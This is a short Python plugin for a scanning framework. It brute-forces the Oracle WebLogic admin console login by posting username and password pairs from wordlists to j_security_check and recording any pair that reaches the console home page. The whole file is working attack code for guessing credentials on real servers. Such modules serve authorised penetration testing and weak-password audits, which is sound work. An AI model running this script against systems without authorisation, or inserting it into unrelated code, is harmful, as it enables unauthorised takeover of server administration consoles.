#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEBLOGIC
        self.name = 'weblogic burst'
        self.keyword = ['weblogic']
        self.info = 'weblogic burst'
        self.type = 'weakpass'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)


    def prove(self):
        self.get_url()
        if self.base_url:
            headers = {
                'Content-Type':  'application/x-www-form-urlencoded'
            }
            usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(
                'dict/weblogic_usernames.txt')
            passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(
                'dict/weblogic_passwords.txt')

            url = self.base_url + 'console/j_security_check'
            for linef1 in usernamedic:
                username = linef1.strip('\r').strip('\n')
                for linef2 in passworddic:
                    try:
                        password = (
                        linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                            '\r').strip('\n')

                        data = 'j_username={}&j_password={}&j_character_encoding=UTF-8'.format(username, password)
                        res = self.curl('post', url, data = data, headers=headers )
                        if res != None and  ('Home Page'in res.text or 'WebLogic Server Console' in res.text and 'console.portal'in res.text):

                            self.flag = 1
                            self.res.append({"info": username + "/" + password, "key": "weblogic burst"})
                            return
                    except Exception:
                        pass
